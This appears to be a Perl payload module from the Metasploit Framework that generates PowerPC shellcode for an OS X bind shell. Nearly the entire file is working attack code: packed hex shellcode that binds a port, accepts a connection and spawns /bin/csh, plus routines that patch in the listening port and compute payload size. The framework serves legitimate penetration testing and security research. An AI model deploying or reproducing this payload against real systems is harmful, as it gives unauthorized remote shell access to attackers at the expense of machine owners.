
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::osx_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
  'Name'         => 'OSX Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Arch'         => [ 'ppc' ],
  'Priv'         => 0,
  'OS'           => [ 'osx' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $off_port = 34;
  
  # bind, listen, accept, dup2, execve(/bin/csh)
  # /bin/csh + null < /bin/sh + setuid(0)
  my $shellcode = pack('N*',
    0x38600002,0x38800001,0x38a00006,0x38000061,
    0x44000002,0x7c000278,0x7c7e1b78,0x4800000d,
    0x00022212,0x00000000,0x7c8802a6,0x38a00010,
    0x38000068,0x7fc3f378,0x44000002,0x7c000278,
    0x3800006a,0x7fc3f378,0x44000002,0x7c000278,
    0x7fc3f378,0x3800001e,0x38800010,0x9081ffe8,
    0x38a1ffe8,0x3881fff0,0x44000002,0x7c000278,
    0x7c7e1b78,0x38a00002,0x3800005a,0x7fc3f378,
    0x7ca42b78,0x44000002,0x7c000278,0x38a5ffff,
    0x2c05ffff,0x4082ffe5,
    # vfork added to work around threaded apps :(
    #0x38000042, 0x44000002, 0x7c000278,    
    # now do the real execve 
    0x7ca52a79,0x4082fffd,
    0x7c6802a6,0x38630028,0x9061fff8,0x90a1fffc,
    0x3881fff8,0x3800003b,0x7c0004ac,0x44000002,
    0x7c000278,0x7fe00008,0x2f62696e,0x2f637368,
    0x00000000,
  );

  my $port_bin = pack('n', $port);
  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate(4444);
  return(length($bin));
}

1;
